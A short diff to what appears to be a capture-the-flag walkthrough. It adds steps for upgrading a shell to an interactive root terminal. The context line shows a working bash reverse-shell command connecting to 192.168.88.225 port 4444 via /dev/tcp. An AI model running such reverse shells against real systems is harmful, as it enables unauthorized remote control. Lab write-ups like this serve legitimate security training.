@@ -218,3 +218,12 @@ $EXEC("bash -c 'bash -i >& /dev/tcp/192.168.88.225/4444 0>&1'")
 
 Now, we also have a root.txt.
 
+### Get normal shell for root
+```
+# Target
+python -c 'import pty;pty.spawn("/bin/bash")'
+^Z
+# Local
+stty raw -echo
+f + g + Enter
+```
